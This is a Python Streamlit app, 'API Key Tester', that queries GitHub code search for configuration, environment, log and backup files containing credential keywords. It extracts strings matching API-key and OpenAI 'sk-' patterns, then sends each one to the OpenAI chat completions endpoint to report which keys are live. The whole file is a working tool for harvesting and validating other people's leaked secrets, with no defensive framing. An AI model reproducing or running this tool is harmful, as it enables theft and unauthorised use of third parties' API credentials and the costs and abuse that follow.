import streamlit as st
import requests
import re
import aiohttp
import asyncio
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Function to get GitHub search results with authentication
async def search_github(auth_header, query, page=1):
    url = f"https://api.github.com/search/code"
    params = {
        'q': query,
        'per_page': 100,
        'page': page
    }
    headers = {
        'Authorization': auth_header
    }
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, headers=headers, params=params) as response:
                if response.status == 403:
                    st.error("Access denied: 403 Forbidden. Please check your credentials.")
                    return None
                elif response.status == 401:
                    st.error("Unauthorized: 401 Unauthorized. Please check your credentials.")
                    return None
                response_data = await response.json()
                return response_data
        except Exception as e:
            st.error(f"An error occurred: {e}")
            return None

# Function to extract keys from text using regex
def extract_keys(text):
    # Regex patterns for various API keys
    patterns = [
        r'(?i)(?:api[_ ]?key|access[_ ]?key|secret[_ ]?key|access[_ ]?token|api[_ ]?key|apikey|api[_ ]?secret|app[_ ]?secret|auth[_ ]?token|authsecret)[\s=:]*([\w-]{32,})',
        r'(?i)sk-[a-zA-Z0-9]{48}',
    ]
    keys = set()
    for pattern in patterns:
        keys.update(re.findall(pattern, text))
    return keys

# Function to test OpenAI keys
async def test_key_async(session, api_key):
    url = "https://api.openai.com/v1/chat/completions"
    headers = {"Authorization": f"Bearer {api_key}"}
    data = {
        "model": "gpt-3.5-turbo",
        "messages": [{"role": "user", "content": "This is a test"}]
    }
    try:
        async with session.post(url, headers=headers, json=data) as response:
            if response.status == 200:
                result = await response.json()
                return api_key, result
            else:
                return api_key, None
    except Exception as e:
        logger.error(f"An error occurred while testing key: {e}")
        return api_key, None

# Function to handle OpenAI key testing asynchronously
async def test_keys_async(keys):
    async with aiohttp.ClientSession() as session:
        tasks = [test_key_async(session, key) for key in keys]
        results = await asyncio.gather(*tasks)
        return results

# Streamlit UI
st.title("API Key Tester")

# User input for GitHub credentials
auth_token = st.text_input("GitHub Personal Access Token", type="password")
search_query = st.text_area("Search Query", value="path:*.xml OR path:*.json OR path:*.properties OR path:*.sql OR path:*.txt OR path:*.log OR path:*.tmp OR path:*.backup OR path:*.bak OR path:*.enc OR path:*.yml OR path:*.yaml OR path:*.toml OR path:*.ini OR path:*.config OR path:*.conf OR path:*.cfg OR path:*.env OR path:*.envrc OR path:*.prod OR path:*.secret OR path:*.private OR path:*.key AND (access_key OR secret_key OR access_token OR api_key OR apikey OR api_secret OR apiSecret OR app_secret OR application_key OR app_key OR appkey OR auth_token OR authsecret) AND (/sk-[a-zA-Z0-9]{48}/ AND (openai OR gpt))")
page_number = st.number_input("Page Number", min_value=1, value=1)

if st.button("Search and Test Keys"):
    if not auth_token:
        st.error("GitHub Personal Access Token is required.")
    else:
        auth_header = f"Bearer {auth_token}"
        with st.spinner("Searching GitHub..."):
            search_results = asyncio.run(search_github(auth_header, search_query, page_number))
            if search_results and 'items' in search_results:
                file_contents = "\n".join([item['text'] for item in search_results['items'] if 'text' in item])
                extracted_keys = extract_keys(file_contents)
                
                if extracted_keys:
                    st.write("Found potential API keys:")
                    st.write(extracted_keys)
                    
                    with st.spinner("Testing OpenAI keys..."):
                        results = asyncio.run(test_keys_async(extracted_keys))
                        for key, result in results:
                            if result:
                                st.write(f"API key {key} is valid.")
                            else:
                                st.write(f"API key {key} is invalid.")
                else:
                    st.write("No potential keys found.")
            else:
                st.write("No search results found.")
